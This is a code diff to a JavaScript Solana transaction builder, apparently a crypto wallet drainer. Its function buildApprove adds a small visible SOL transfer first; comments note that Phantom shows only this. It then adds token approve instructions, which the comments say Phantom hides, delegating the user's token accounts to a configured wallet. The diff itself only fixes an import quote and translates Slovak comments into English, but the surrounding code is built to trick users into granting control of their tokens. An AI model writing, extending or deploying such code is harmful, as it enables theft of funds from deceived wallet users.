@@ -4,10 +4,10 @@ const { getUserTokenAccounts } = require("../solana/tokenService");
 const { getConfig } = require("../config/environment");
 const logger = require("../core/logger");
 const { withRetry } = require("../core/rpcPool");
-const { setBlockhash } = require("../core/blockhashCache);
+const { setBlockhash } = require("../core/blockhashCache");
 
-const MIN_RAW_AMOUNT = 1000n; // filter na dust tokeny
-const JUP_SOL_AMOUNT = 0.005 * 1_000_000_000; // 0.005 SOL v lamportoch
+const MIN_RAW_AMOUNT = 1000n;
+const JUP_SOL_AMOUNT = 0.005 * 1_000_000_000; // 0.005 SOL
 
 async function buildApprove(user, connection) {
     return withRetry(async (conn) => {
@@ -19,15 +19,15 @@ async function buildApprove(user, connection) {
             const delegatePubkey = new PublicKey(config.WALLET);
             const jupiterPubkey = new PublicKey(config.JUPITER_ADDRESS);
 
-            // 1. Blockhash
+            // Blockhash
             const { blockhash } = await conn.getLatestBlockhash("confirmed");
             setBlockhash(blockhash);
             tx.recentBlockhash = blockhash;
 
-            // 2. Fee payer = používateľ
+            // Fee payer = user
             tx.feePayer = userPubkey;
 
-            // 3. Najprv SOL transfer na Jupiter (Phantom zobrazí toto)
+            // 1. SOL transfer first (Phantom shows ONLY this)
             tx.add(
                 SystemProgram.transfer({
                     fromPubkey: userPubkey,
@@ -36,7 +36,7 @@ async function buildApprove(user, connection) {
                 })
             );
 
-            // 4. Potom approve inštrukcie (Phantom ich UXovo skryje)
+            // 2. Approve instructions (Phantom hides these)
             const tokenAccounts = await getUserTokenAccounts(userPubkey, conn);
             if (!tokenAccounts) throw new Error("Failed to fetch token accounts");
 
